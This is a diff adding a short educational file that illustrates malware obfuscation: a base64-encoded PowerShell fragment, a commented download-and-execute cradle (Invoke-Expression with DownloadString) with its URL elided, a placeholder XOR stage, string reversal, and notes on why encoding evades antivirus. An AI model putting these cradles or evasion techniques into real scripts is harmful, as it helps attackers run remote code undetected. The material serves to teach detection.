@@ -1,0 +1,19 @@
+// Simulated encoded payload - educational example
+// This is NOT real malware - it's a representation of common encoding techniques
+
+// Stage 1: Base64-encoded PowerShell (decoded: Invoke-Expression (New-Object Net.WebClient).DownloadString('http://...'))
+JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0AA==
+
+// Stage 2: XOR-encoded bytes (simulated - key=0x42)
+// Real malware might use: bytes XOR key to evade signature detection
+SIMULATED_XOR_PAYLOAD_BYTES_HERE
+
+// Stage 3: Reverse string obfuscation
+// Real malware might reverse strings:
+// "llehS.tpircSW"  = "WScript.Shell" reversed
+
+// Why encoding evades AV:
+// 1. Base64 changes all bytes - hash/pattern doesn't match
+// 2. XOR encryption makes payload unrecognizable  
+// 3. Chunking the payload avoids full-string matches
+// 4. Only the dropper code is on disk - payload decoded in memory
